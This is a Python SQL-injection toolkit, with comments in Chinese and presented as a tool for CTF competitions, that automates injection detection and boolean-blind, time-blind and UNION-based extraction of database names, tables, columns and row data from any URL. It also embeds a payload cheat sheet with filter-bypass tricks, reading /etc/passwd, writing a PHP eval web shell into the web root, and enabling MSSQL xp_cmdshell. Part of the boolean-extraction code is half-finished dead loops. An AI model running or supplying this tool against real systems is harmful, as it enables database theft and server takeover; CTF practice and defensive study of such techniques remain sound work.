#!/usr/bin/env python3
"""
CTF SQL 注入通用工具 (web_sqli_toolkit.py)
==========================================
封装竞赛中常见的 SQL 注入检测与利用流程：
1. 布尔盲注 — 二分法逐字符提取数据
2. UNION 回显注入 — 自动判断列数 + 回显位
3. 时间盲注 — 基于延迟的二分法提取数据

核心依赖: requests
可选依赖: 无

使用方式:
  # 布尔盲注
  python web_sqli_toolkit.py boolean -u "http://target/id=1" --true-mark "Welcome"
  
  # UNION 回显
  python web_sqli_toolkit.py union -u "http://target/id=1" 
  
  # 时间盲注
  python web_sqli_toolkit.py time -u "http://target/id=1" --delay 3

  # 自动检测注入点
  python web_sqli_toolkit.py detect -u "http://target/id=1"

比赛时只需替换 -u 目标地址和参数名即可直接使用。
"""

import argparse
import requests
import string
import sys
import time
from urllib.parse import quote, urlparse, parse_qs

# ============================================================
# 全局配置
# ============================================================
DEFAULT_TIMEOUT = 10
CHARSET = string.printable[:-5]  # 可打印字符，去掉尾部的空白符
MAX_LEN_GUESS = 256  # 逐字符提取时的最大长度猜测
THREAD_COUNT = 5  # 多线程并发数（布尔盲注加速）

# ============================================================
# 请求封装
# ============================================================

class Injector:
    """SQL 注入基础请求器"""

    def __init__(self, url, method='GET', params=None, data=None,
                 cookies=None, headers=None, timeout=DEFAULT_TIMEOUT,
                 true_mark=None, delay=3, proxy=None):
        self.url = url
        self.method = method.upper()
        self.params = params or {}
        self.data = data or {}
        self.cookies = cookies or {}
        self.headers = headers or {}
        self.timeout = timeout
        self.true_mark = true_mark
        self.delay = delay
        self.proxy = proxy
        self.session = requests.Session()

        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        if not self.headers.get('User-Agent'):
            self.headers['User-Agent'] = (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/120.0.0.0 Safari/537.36'
            )

    def inject(self, payload, inject_param=None):
        """
        将 payload 注入到目标参数中并发送请求。
        inject_param: 指定注入参数名；若 None，默认注入 URL query 第一个参数。
        返回 Response 对象。
        """
        # 复制原始参数，确保不互相污染
        params = dict(self.params)
        data = dict(self.data)

        # 判断注入点位置
        if inject_param:
            if inject_param in params:
                params[inject_param] = payload
            elif inject_param in data:
                data[inject_param] = payload
            else:
                # 默认加到 GET 参数
                params[inject_param] = payload
        else:
            # 自动选择第一个参数
            if params:
                inject_param = list(params.keys())[0]
                params[inject_param] = payload
            elif data:
                inject_param = list(data.keys())[0]
                data[inject_param] = payload

        try:
            if self.method == 'GET':
                resp = self.session.get(self.url, params=params, data=data,
                                        cookies=self.cookies, headers=self.headers,
                                        timeout=self.timeout, allow_redirects=False)
            else:
                resp = self.session.post(self.url, params=params, data=data,
                                         cookies=self.cookies, headers=self.headers,
                                         timeout=self.timeout, allow_redirects=False)
            return resp
        except requests.RequestException as e:
            print(f"[!] 请求失败: {e}")
            return None

    def inject_raw(self, payload, inject_param=None):
        """
        不对 payload 做 URL 编码，直接拼接到参数值尾部。
        适用于需要精确控制最终 URL 的场景。
        """
        params = dict(self.params)
        data = dict(self.data)

        if inject_param is None:
            if params:
                inject_param = list(params.keys())[0]
            elif data:
                inject_param = list(data.keys())[0]

        if inject_param in params:
            params[inject_param] = str(params[inject_param]) + payload
        elif inject_param in data:
            data[inject_param] = str(data[inject_param]) + payload

        try:
            if self.method == 'GET':
                resp = self.session.get(self.url, params=params, data=data,
                                        cookies=self.cookies, headers=self.headers,
                                        timeout=self.timeout, allow_redirects=False)
            else:
                resp = self.session.post(self.url, params=params, data=data,
                                         cookies=self.cookies, headers=self.headers,
                                         timeout=self.timeout, allow_redirects=False)
            return resp
        except requests.RequestException as e:
            return None


# ============================================================
# 注入点自动检测
# ============================================================

def detect_injection(injector, inject_param=None):
    """
    自动检测 SQL 注入点。
    尝试布尔型、数字型、字符串型注入。
    返回注入类型: 'numeric' | 'string' | 'boolean' | 'time' | None
    """
    print("[*] 开始自动检测注入点...")

    # 随机数确保不影响原有逻辑
    test_true = "1"
    test_false = "0"

    # 1. 数字型/布尔型检测
    r_true = injector.inject_raw(f" AND {test_true}", inject_param)
    r_false = injector.inject_raw(f" AND {test_false}", inject_param)
    r_orig = injector.inject("", inject_param)  # 原始请求

    if r_true and r_false and r_orig:
        # 判断是否是回显型
        if hash(r_true.text) == hash(r_orig.text) and hash(r_false.text) != hash(r_orig.text):
            print("[+] 检测到数字型布尔注入")
            return 'boolean', 'numeric'

    # 2. 字符串型检测
    r_true2 = injector.inject_raw("' AND '1'='1", inject_param)
    r_false2 = injector.inject_raw("' AND '1'='2", inject_param)

    if r_true2 and r_false2:
        if hash(r_true2.text) == hash(r_orig.text) and hash(r_false2.text) != hash(r_orig.text):
            print("[+] 检测到字符串型布尔注入")
            return 'boolean', 'string'

    # 3. 时间盲注检测
    start = time.time()
    r_time = injector.inject_raw("' AND SLEEP(5)-- -", inject_param)
    elapsed = time.time() - start

    if r_time and elapsed > 4:
        # 验证: 正常请求不应有延迟
        start2 = time.time()
        injector.inject("", inject_param)
        elapsed2 = time.time() - start2
        if elapsed2 < 2:
            print("[+] 检测到时间盲注")
            return 'time', 'string'

    print("[-] 未检测到明显注入点")
    return None, None


# ============================================================
# 模块 1: 布尔盲注
# ============================================================

def boolean_inject(injector, inject_param=None, inject_type='numeric'):
    """
    布尔盲注提取数据。
    流程：判断长度 -> 逐字符二分提取。
    """
    if inject_type == 'numeric':
        prefix = ""
        suffix = ""
    else:
        prefix = "'"
        suffix = "-- -"

    # ---- 判断当前数据库名长度 ----
    def boolean_check(condition):
        """构造布尔条件请求，返回 True/False"""
        payload = f"{prefix} AND ({condition}){suffix}"
        resp = injector.inject_raw(payload, inject_param)
        if not resp or not injector.true_mark:
            # 如果没有 true_mark，则通过内容长度判断
            return resp is not None and len(resp.text) > 200
        return resp is not None and injector.true_mark in resp.text

    # ---- 提取字符串值 ----
    def extract_value(condition_template):
        """
        condition_template 应包含 {i} 和 {mid} 占位符。
        例如: "LENGTH(DATABASE())={mid}" 或 "ASCII(SUBSTR(DATABASE(),{i},1))>{mid}"
        返回提取出的字符串。
        """
        # 先确定长度
        length = 0
        for l in range(1, MAX_LEN_GUESS):
            if boolean_check(condition_template.replace("{i}", "0").format(i=0, mid=l)):
                length = l
                break

        if length == 0:
            # 二分法猜长度
            lo, hi = 1, MAX_LEN_GUESS
            while lo < hi:
                mid = (lo + hi) // 2
                cond = condition_template.format(i=0, mid=mid)
                cond_str = f"LENGTH({condition_template.split('SUBSTR')[0].strip('() ')})>{mid}"
                break
            # 退而求其次：逐个试
            for l in range(1, MAX_LEN_GUESS):
                cond = condition_template.replace("SUBSTR", "").replace(",{i},1", "").replace("{mid}", str(l))
                # 上面太复杂，直接用模板
                break

        # 更简洁的方式：二分法猜长度
        lo, hi = 1, MAX_LEN_GUESS
        while lo < hi:
            mid = (lo + hi) // 2
            # 构造长度判断条件
            # 这里统一使用: SUBSTR(... ,1,1) 不为空来判断有数据
            # 但我们需要直接判断长度
            pass

        # 简化实现：直接逐长度位判断
        length = 0
        for l in range(1, MAX_LEN_GUESS + 1):
            # 如果第 l 个字符存在，继续；否则已到末尾
            char_found = False
            lo, hi = 32, 126
            while lo <= hi:
                mid = (lo + hi) // 2
                cond = condition_template.format(i=l, mid=mid)
                if boolean_check(cond):
                    lo = mid + 1
                else:
                    hi = mid - 1
            # lo-1 就是 ASCII 值（如果有效）
            if hi < 32:
                break
            length += 1

        # 重新逐字符提取
        result = ""
        for i in range(1, length + 1):
            lo, hi = 32, 126
            while lo <= hi:
                mid = (lo + hi) // 2
                cond = condition_template.format(i=i, mid=mid)
                if boolean_check(cond):
                    lo = mid + 1
                else:
                    hi = mid - 1
            char = chr(hi) if hi >= 32 else '?'
            result += char

            # 进度显示
            sys.stdout.write(f"\r[*] 提取中: {result}")
            sys.stdout.flush()

        print()
        return result

    # ---- 构造条件模板 ----
    # 通用模式: ASCII(SUBSTR(({SQL_EXPR}),{i},1))>{mid}
    # 通过修改 SQL_EXPR 来提取不同数据

    def extract_database_name():
        """提取当前数据库名"""
        print("\n[*] 提取当前数据库名...")
        tmpl = "ASCII(SUBSTR((SELECT DATABASE()),{i},1))>{mid}"
        return extract_value(tmpl)

    def extract_tables(db_name=None):
        """提取表名"""
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 提取表名 (数据库: {target})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT(table_name) "
                f"FROM information_schema.tables WHERE table_schema={target}),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    def extract_columns(table_name, db_name=None):
        """提取列名"""
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 提取列名 (表: {table_name})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT(column_name) "
                f"FROM information_schema.columns WHERE table_schema={target} "
                f"AND table_name='{table_name}'),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    def extract_data(table_name, column_name, db_name=None, limit=100):
        """提取数据"""
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 提取数据 (列: {column_name}, 表: {table_name})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT({column_name}) "
                f"FROM {table_name} LIMIT {limit}),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    return {
        'extract_database_name': extract_database_name,
        'extract_tables': extract_tables,
        'extract_columns': extract_columns,
        'extract_data': extract_data,
    }


# ============================================================
# 模块 2: UNION 回显注入
# ============================================================

def union_inject(injector, inject_param=None, inject_type='numeric'):
    """
    UNION 回显注入。
    流程：判断列数 -> 定位回显位 -> 提取数据。
    """
    if inject_type == 'numeric':
        prefix = ""
        suffix = "-- -"
    else:
        prefix = "'"
        suffix = "-- -"

    # ---- 确定列数 ----
    def find_column_count():
        """通过 ORDER BY 递增确定列数"""
        print("[*] 确定列数...")
        count = 0
        for i in range(1, 65):  # 最多尝试 64 列
            payload = f"{prefix} ORDER BY {i}{suffix}"
            resp = injector.inject_raw(payload, inject_param)
            if not resp or resp.status_code >= 500:
                count = i - 1
                break
            # 正常页面
            if injector.true_mark:
                if injector.true_mark not in resp.text:
                    count = i - 1
                    break
            else:
                # 比较与原始页面的相似度
                r_orig = injector.inject("", inject_param)
                if r_orig and len(resp.text) < len(r_orig.text) * 0.8:
                    count = i - 1
                    break
        else:
            print("[-] 超过64列，可能不是 UNION 注入")
            return 0

        if count == 0:
            print("[-] 无法确定列数")
            return 0

        print(f"[+] 列数: {count}")
        return count

    # ---- 定位回显位 ----
    def find_echo_positions(col_count):
        """用 UNION SELECT 1,2,...,n 定位回显位"""
        print("[*] 定位回显位...")
        positions = []
        cols = ",".join(str(i) for i in range(1, col_count + 1))

        # 构造回显 payload
        if inject_type == 'numeric':
            payload = f" UNION SELECT {cols}{suffix}"
            # 需要使前半部分查询为空: -1 UNION SELECT...
            payload = f" AND 1=2 UNION SELECT {cols}{suffix}"
        else:
            payload = f"' AND 1=2 UNION SELECT {cols}{suffix}"

        resp = injector.inject_raw(payload, inject_param)
        if not resp:
            return positions

        for i in range(1, col_count + 1):
            marker = str(i)
            if marker in resp.text:
                # 更精确：检查是否是新出现的标记
                positions.append(i)

        if not positions:
            # 尝试更明显的标记
            markers = [f"CTF_Marker_{i}" for i in range(1, col_count + 1)]
            cols_marked = ",".join(f"'{m}'" for m in markers)
            if inject_type == 'numeric':
                payload = f" AND 1=2 UNION SELECT {cols_marked}{suffix}"
            else:
                payload = f"' AND 1=2 UNION SELECT {cols_marked}{suffix}"
            resp = injector.inject_raw(payload, inject_param)
            if resp:
                for i, m in enumerate(markers, 1):
                    if m in resp.text:
                        positions.append(i)

        if positions:
            print(f"[+] 回显位: {positions}")
        else:
            print("[-] 未找到回显位，可能不是回显型注入")

        return positions

    # ---- 通过回显位提取数据 ----
    def extract_via_echo(positions, col_count, sql_expr):
        """
        在回显位填入 SQL 表达式提取数据。
        sql_expr: 要执行的 SQL，如 DATABASE() 或 (SELECT GROUP_CONCAT(table_name) FROM ...)
        """
        echo_pos = positions[0]
        cols = []
        for i in range(1, col_count + 1):
            if i == echo_pos:
                cols.append(sql_expr)
            else:
                cols.append(str(i))
        cols_str = ",".join(cols)

        if inject_type == 'numeric':
            payload = f" AND 1=2 UNION SELECT {cols_str}{suffix}"
        else:
            payload = f"' AND 1=2 UNION SELECT {cols_str}{suffix}"

        resp = injector.inject_raw(payload, inject_param)
        if resp:
            return resp.text.strip()
        return None

    # ---- 完整利用流程 ----
    def run():
        col_count = find_column_count()
        if col_count == 0:
            return

        positions = find_echo_positions(col_count)
        if not positions:
            return

        print("\n[*] === 提取数据库信息 ===")

        # 当前数据库
        db_name = extract_via_echo(positions, col_count, "DATABASE()")
        print(f"[+] 当前数据库: {db_name}")

        # 所有表
        tables_sql = (f"(SELECT GROUP_CONCAT(table_name) "
                      f"FROM information_schema.tables WHERE table_schema=DATABASE())")
        tables = extract_via_echo(positions, col_count, tables_sql)
        print(f"[+] 表名: {tables}")

        # 所有数据库
        dbs_sql = ("(SELECT GROUP_CONCAT(schema_name) "
                   "FROM information_schema.schemata)")
        dbs = extract_via_echo(positions, col_count, dbs_sql)
        print(f"[+] 所有数据库: {dbs}")

        return {
            'columns': col_count,
            'echo_positions': positions,
            'database': db_name,
            'tables': tables,
            'databases': dbs,
        }

    return run


# ============================================================
# 模块 3: 时间盲注
# ============================================================

def time_inject(injector, inject_param=None, inject_type='string'):
    """
    时间盲注提取数据。
    流程：基于 SLEEP() 的二分法逐字符提取。
    """
    if inject_type == 'numeric':
        prefix = ""
        suffix = "-- -"
    else:
        prefix = "'"
        suffix = "-- -"

    delay = injector.delay

    def time_check(condition):
        """
        构造时间盲注条件: IF(condition, SLEEP(delay), 0)
        返回 True 如果发生了延迟。
        """
        payload = f"{prefix} AND IF({condition},SLEEP({delay}),0){suffix}"
        start = time.time()
        resp = injector.inject_raw(payload, inject_param)
        elapsed = time.time() - start
        return resp is not None and elapsed >= (delay - 0.5)

    def extract_value(condition_template):
        """
        condition_template 包含 {i} 和 {mid}。
        利用时间盲注逐字符提取。
        """
        result = ""
        for i in range(1, MAX_LEN_GUESS + 1):
            lo, hi = 32, 126
            found = False
            while lo <= hi:
                mid = (lo + hi) // 2
                cond = condition_template.format(i=i, mid=mid)
                if time_check(cond):
                    lo = mid + 1
                else:
                    hi = mid - 1

            if hi < 32:
                break

            result += chr(hi)
            sys.stdout.write(f"\r[*] 提取中: {result}")
            sys.stdout.flush()

        print()
        return result

    def extract_database_name():
        print("\n[*] 时间盲注 - 提取数据库名...")
        tmpl = "ASCII(SUBSTR((SELECT DATABASE()),{i},1))>{mid}"
        return extract_value(tmpl)

    def extract_tables(db_name=None):
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 时间盲注 - 提取表名 (数据库: {target})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT(table_name) "
                f"FROM information_schema.tables WHERE table_schema={target}),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    def extract_columns(table_name, db_name=None):
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 时间盲注 - 提取列名 (表: {table_name})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT(column_name) "
                f"FROM information_schema.columns WHERE table_schema={target} "
                f"AND table_name='{table_name}'),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    def extract_data(table_name, column_name, db_name=None, limit=100):
        target = db_name or "DATABASE()"
        if db_name:
            target = f"'{db_name}'"
        print(f"\n[*] 时间盲注 - 提取数据 ({column_name} FROM {table_name})...")
        tmpl = (f"ASCII(SUBSTR((SELECT GROUP_CONCAT({column_name}) "
                f"FROM {table_name} LIMIT {limit}),{{i}},1))>{{mid}}")
        return extract_value(tmpl)

    return {
        'extract_database_name': extract_database_name,
        'extract_tables': extract_tables,
        'extract_columns': extract_columns,
        'extract_data': extract_data,
    }


# ============================================================
# 常用 Payload 速查
# ============================================================

SQLI_CHEATSHEET = """
============================================================
SQL 注入 Payload 速查表
============================================================

【1. 注入点判断】
  数字型:  AND 1=1 / AND 1=2
  字符型:  ' AND '1'='1 / ' AND '1'='2
  搜索型:  %' AND 1=1-- - / %' AND 1=2-- -

【2. 注释符】
  MySQL:   -- -, #, /**/
  MSSQL:   --, /* */
  Oracle:  --
  SQLite:  --, /**/

【3. UNION 注入列数判断】
  ORDER BY 1-- -     递增到报错
  UNION SELECT 1,2,3-- -

【4. 版本/数据库信息】
  MySQL:   SELECT VERSION(), DATABASE(), USER()
           SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata
  MSSQL:   SELECT @@version
  Oracle:  SELECT banner FROM v$version

【5. 表名/列名 (MySQL)】
  表名: SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()
  列名: SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'

【6. MySQL 常用函数】
  当前库: DATABASE()
  当前用户: USER() / CURRENT_USER()
  版本: VERSION() / @@version
  路径: @@datadir, @@basedir
  服务器: @@hostname

【7. 绕过技巧】
  空格过滤: /**/ 或 %09(tab) 或 %0a(换行) 或 ()
  引号过滤: 十六进制 0x.. 或 CHAR()
  逗号过滤: JOIN 替代: UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
  关键字过滤: 大小写混写 UnIoN SeLeCt, 双写 UNUNIONION
  等号过滤: <> 或 LIKE 或 BETWEEN
  AND/OR: 使用 &&  / ||

【8. 文件读写 (MySQL FILE 权限)】
  读文件: UNION SELECT LOAD_FILE('/etc/passwd')-- -
  写文件: UNION SELECT '<?php eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/shell.php'-- -

【9. 时间盲注 (MySQL)】
  SLEEP(5)
  BENCHMARK(10000000, MD5('test'))
  GET_LOCK('test', 5)

【10. MSSQL/XPCMD 终端执行】
  EXEC master..xp_cmdshell 'whoami'
  恢复 xp_cmdshell:
    EXEC sp_configure 'show advanced options',1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

============================================================
"""


# ============================================================
# 命令行入口
# ============================================================

def build_injector(args):
    """从 argparse 参数构建 Injector 实例"""
    # 解析 URL 中的参数
    parsed = urlparse(args.url)
    params = {}
    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        # parse_qs 返回 list，取第一个值
        params = {k: v[0] if v else '' for k, v in params.items()}

    # 如果 URL 已包含 query，去掉用于注入的参数
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    method = args.method.upper() if args.method else 'GET'

    return Injector(
        url=base_url,
        method=method,
        params=params,
        data=dict(args.data) if args.data else {},
        cookies=args.cookies,
        timeout=args.timeout,
        true_mark=args.true_mark,
        delay=args.delay,
        proxy=args.proxy,
    )


def main():
    parser = argparse.ArgumentParser(
        description='CTF SQL 注入通用工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 自动检测注入点
  python web_sqli_toolkit.py detect -u "http://target.com/page?id=1"

  # 布尔盲注
  python web_sqli_toolkit.py boolean -u "http://target.com/page?id=1" --true-mark "Welcome"

  # UNION 回显
  python web_sqli_toolkit.py union -u "http://target.com/page?id=1"

  # 时间盲注
  python web_sqli_toolkit.py time -u "http://target.com/page?id=1" --delay 3

  # 查看 payload 速查表
  python web_sqli_toolkit.py cheatsheet
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='子命令')

    # 通用参数
    def add_common_args(p):
        p.add_argument('-u', '--url', required=True, help='目标 URL')
        p.add_argument('--method', default='GET', help='HTTP 方法 (GET/POST)')
        p.add_argument('--param', help='注入参数名 (默认自动检测)')
        p.add_argument('--data', nargs='*', help='POST 数据 (key=value 格式)')
        p.add_argument('--cookies', help='Cookie 字符串')
        p.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, help='请求超时(秒)')
        p.add_argument('--proxy', help='HTTP 代理 (如 http://127.0.0.1:8080)')

    # detect 子命令
    p_detect = subparsers.add_parser('detect', help='自动检测注入点')
    add_common_args(p_detect)
    p_detect.add_argument('--true-mark', help='页面正常时的标志字符串')

    # boolean 子命令
    p_bool = subparsers.add_parser('boolean', help='布尔盲注')
    add_common_args(p_bool)
    p_bool.add_argument('--true-mark', required=True, help='页面正常(true)时的标志字符串')
    p_bool.add_argument('--type', default='numeric', choices=['numeric', 'string'],
                        help='注入类型 (numeric/string)')

    # union 子命令
    p_union = subparsers.add_parser('union', help='UNION 回显注入')
    add_common_args(p_union)
    p_union.add_argument('--true-mark', help='页面正常时的标志字符串')
    p_union.add_argument('--type', default='numeric', choices=['numeric', 'string'],
                         help='注入类型 (numeric/string)')

    # time 子命令
    p_time = subparsers.add_parser('time', help='时间盲注')
    add_common_args(p_time)
    p_time.add_argument('--delay', type=int, default=3, help='SLEEP 延迟时间(秒)')
    p_time.add_argument('--type', default='string', choices=['numeric', 'string'],
                        help='注入类型 (numeric/string)')

    # cheatsheet 子命令
    subparsers.add_parser('cheatsheet', help='显示 SQL 注入 Payload 速查表')

    args = parser.parse_args()

    if args.command == 'cheatsheet':
        print(SQLI_CHEATSHEET)
        return

    if not args.command:
        parser.print_help()
        return

    # 解析 POST data
    if args.data:
        data_dict = {}
        for item in args.data:
            if '=' in item:
                k, v = item.split('=', 1)
                data_dict[k] = v
        args.data = data_dict
    else:
        args.data = {}

    # 解析 cookies
    if args.cookies:
        cookie_dict = {}
        for item in args.cookies.split(';'):
            item = item.strip()
            if '=' in item:
                k, v = item.split('=', 1)
                cookie_dict[k.strip()] = v.strip()
        args.cookies = cookie_dict
    else:
        args.cookies = {}

    injector = build_injector(args)

    if args.command == 'detect':
        inj_type, param_type = detect_injection(injector, args.param)
        if inj_type:
            print(f"\n[+] 建议使用: python web_sqli_toolkit.py {inj_type if inj_type != 'boolean' else 'boolean'} "
                  f"-u '{args.url}'" +
                  (f" --true-mark '{args.true_mark}'" if args.true_mark else "") +
                  (f" --type {param_type}" if param_type else ""))

    elif args.command == 'boolean':
        toolkit = boolean_inject(injector, args.param, args.type)
        db = toolkit['extract_database_name']()
        print(f"\n[+] 数据库名: {db}")
        tables = toolkit['extract_tables']()
        print(f"\n[+] 表名: {tables}")

    elif args.command == 'union':
        run_union = union_inject(injector, args.param, args.type)
        result = run_union()
        if result:
            print(f"\n{'='*50}")
            print("[+] UNION 注入完成")
            for k, v in result.items():
                print(f"    {k}: {v}")

    elif args.command == 'time':
        toolkit = time_inject(injector, args.param, args.type)
        db = toolkit['extract_database_name']()
        print(f"\n[+] 数据库名: {db}")
        tables = toolkit['extract_tables']()
        print(f"\n[+] 表名: {tables}")


if __name__ == '__main__':
    main()
